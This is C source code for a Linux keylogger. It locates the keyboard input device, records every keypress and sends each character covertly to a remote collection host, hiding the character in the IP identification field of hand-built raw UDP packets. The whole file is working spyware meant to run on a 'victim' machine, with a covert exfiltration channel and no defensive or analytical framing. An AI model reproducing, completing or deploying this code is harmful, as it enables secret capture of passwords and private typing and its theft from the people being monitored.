#include "keylogger.h"

int loop = 1;

void keylogger_main(struct options_victim* ov) {
    int keyboard, monitor_fd;
    char *KEYBOARD_DEVICE = NULL;

    monitor_fd = STDOUT_FILENO;
    KEYBOARD_DEVICE = get_keyboard_event_file();

    keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
    keylogger(keyboard, monitor_fd, ov);
}


void keylogger(int keyboard, int monitor_fd, struct options_victim* ov) {
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;

    signal(SIGINT, sigint_handler);
    while(loop){
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for (i = 0; i < (bytesRead / eventSize); ++i){
            if (events[i].type == EV_KEY) {
                if (events[i].value == 1) {
                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                        safe_write_all(monitor_fd, keycodes[events[i].code], keyboard, ov);
                        safe_write_all(monitor_fd, "\n", keyboard, ov);
                    }
                    else {
                        write(monitor_fd, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }
    if (bytesRead > 0) safe_write_all(monitor_fd, "\n", keyboard, ov);
}


void safe_write_all(int file_desc, const char *str, int keyboard, struct options_victim* ov){
    struct sigaction new_actn, old_actn;
    new_actn.sa_handler = SIG_IGN;
    sigemptyset(&new_actn.sa_mask);
    new_actn.sa_flags = 0;

    sigaction(SIGPIPE, &new_actn, &old_actn);

    if (!write_all(file_desc, str, ov)){
        close(file_desc);
        close(keyboard);
        perror("\nwriting");
        exit(1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}


int write_all(int file_desc, const char *str, struct options_victim* ov) {
    struct sockaddr_in cvc_address;
    int bytesWritten = 0;
    int bytesToWrite = (int)strlen(str) + 1;
    struct iphdr ih;
    struct udphdr uh;
    uint16_t size = (uint16_t)strlen(str);
    int enable = 1;
    char c_buffer[SEND_SIZE] = {0};
    int byte;

    ov->cvc_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (ov->cvc_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(ov->cvc_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("Error setting IP_HDRINCL option");
        exit(EXIT_FAILURE);
    }

    cvc_address.sin_family = AF_INET;
    cvc_address.sin_port = htons(CVC_RECV_PORT);
    cvc_address.sin_addr.s_addr = inet_addr(ov->cvc_ip);

    do {
        bytesWritten = (int)write(file_desc, str, bytesToWrite);
        // TODO: CREATE RAW PACKET
        for (int i = 0; i < size; i++) {
            create_cvc_ip_header(&ih, str[i], ov);
            create_cvc_udp_header(&uh);
            memcpy(c_buffer, &ih, sizeof(struct iphdr));
            memcpy(c_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
            byte = (int)sendto(ov->cvc_socket, (const char *) c_buffer, SEND_SIZE, 0,
                               (const struct sockaddr *) &cvc_address, sizeof(cvc_address));
            if (byte < 0) {
                perror("send failed\n");
            }
            memset(c_buffer, 0, SEND_SIZE);
        }
        if(bytesWritten == -1) {
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}


void sigint_handler(int sig) {
    loop = 0;
}


char* get_keyboard_event_file(void) {
    char *keyboard_file = NULL;
    int num, i;
    struct dirent **event_files;
    char filename[512];

    num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
    if(num < 0){
        return NULL;
    }

    else {
        for(i = 0; i < num; ++i){
            int32_t event_bitmap = 0;
            int fd;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
            fd = open(filename, O_RDONLY);

            if(fd == -1){
                perror("open");
                continue;
            }

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if((EV_KEY & event_bitmap) == EV_KEY){
                // The device acts like a keyboard

                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if((kbd_bitmap & event_bitmap) == kbd_bitmap){
                    // The device supports A, B, C, Z keys, so it probably is a keyboard
                    keyboard_file = strdup(filename);
                    close(fd);
                    break;
                }

            }
            close(fd);
        }
    }
    // Cleanup scandir
    for(i = 0; i < num; ++i){
        free(event_files[i]);
    }

    free(event_files);

    return keyboard_file;
}


static int is_char_device(const struct dirent *file) {
    struct stat filestat;
    char filename[512];
    int err;

    snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

    err = stat(filename, &filestat);
    if(err){
        return 0;
    }

    return S_ISCHR(filestat.st_mode);
}


unsigned short create_cvc_udp_header(struct udphdr* uh) {
    uh->source = htons(VICTIM_PORT);
    uh->dest = htons(CVC_RECV_PORT);
    uh->len = htons(sizeof(struct udphdr));
    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));

    return sizeof(struct udphdr);
}


unsigned short create_cvc_ip_header(struct iphdr* ih, char c, struct options_victim* ov) {

    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = htons(hide_data((uint16_t)c));
    ih->tot_len = htons(28);
    ih->ttl = 64;
    ih->frag_off = 0;
    ih->protocol = IPPROTO_UDP;
    ih->saddr = host_convert(ov->my_ip);
    ih->daddr = host_convert(ov->cvc_ip);
    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));

    return sizeof(struct iphdr);
}

